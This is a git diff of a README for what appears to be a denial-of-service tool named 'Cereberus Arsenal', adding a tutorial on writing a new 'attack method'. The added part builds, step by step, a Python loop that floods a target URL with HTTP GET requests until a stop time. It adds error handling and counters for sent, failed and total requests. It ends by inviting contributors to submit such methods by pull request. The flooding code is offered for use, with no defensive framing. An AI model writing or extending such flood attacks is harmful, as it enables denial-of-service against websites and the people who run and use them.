@@ -1,5 +1,6 @@
 ## Welcome to the arsenal!
-Here you can view all "standard" attack methods/vectors, which can be used by anybody.
+Here you can view all "standard" attack methods/vectors, which can be used by anybody. I tried my best, but i just suck at writing tutorials
+
 <br>
 If you want to add a new method, its really simple
 
@@ -171,5 +172,74 @@ Core.methods.update({
         })
         ```
     
-    - And done! You have now created your own special attack method.
+4. And done, you have now have a function attack!
+    - BUT, its not done yet. Its missing the counters, and the exception handling (very important)
+
+    - Lets start on the exception handling first
+        - We can mitigate errors, by wrapping our `requests.get` piece in a `try: except:` statement:
+        ```py
+        def attacker(attack_id, url, stoptime):
+            while time.time() < stoptime and not Core.killattack:
+                if not Core.attackrunning:
+                    continue
+
+                try:
+                    requests.get(url)
+
+                except Exception:
+                    pass
+        ```
+        - Its not recommended to just silently ignore the error, and we want to count the amount of errors aswell
+    
+    - And now we will add the counters
+        - We start by counting the actual requests **sent**
+        ```py
+        def attacker(attack_id, url, stoptime):
+            while time.time() < stoptime and not Core.killattack:
+                if not Core.attackrunning:
+                    continue
+
+                try:
+                    requests.get(url)
+
+                    Core.infodict[attack_id]['req_sent'] += 1 # we increment the counter by one
+                except Exception:
+                    pass
+        ```
+
+        - Like i said earlier, its not recommended to ignore the error
+        ```py
+        def attacker(attack_id, url, stoptime):
+            while time.time() < stoptime and not Core.killattack:
+                if not Core.attackrunning:
+                    continue
+
+                try:
+                    requests.get(url)
+
+                    Core.infodict[attack_id]['req_sent'] += 1
+                except Exception:
+                    Core.infodict[attack_id]['req_fail'] += 1
+        ```
+        - Now, the method will calculate the requests that were sent, and the ones that failed
+        - We also want to calculate the **total** amount of requests
+        ```py
+        def attacker(attack_id, url, stoptime):
+            while time.time() < stoptime and not Core.killattack:
+                if not Core.attackrunning:
+                    continue
+
+                try:
+                    requests.get(url)
+
+                    Core.infodict[attack_id]['req_sent'] += 1
+                except Exception:
+                    Core.infodict[attack_id]['req_fail'] += 1
+
+                Core.infodict[attack_id]['req_total'] += 1
+        ```
+        - Now, our method will count the requests sent, the failed ones and the total count!
+    
+    - And thats basically it! You now have written a method yourself, worthy of earning a place on the **Cereberus Arsenal**
+
     - If you wish to share it, just make a `pull` request with the new method included
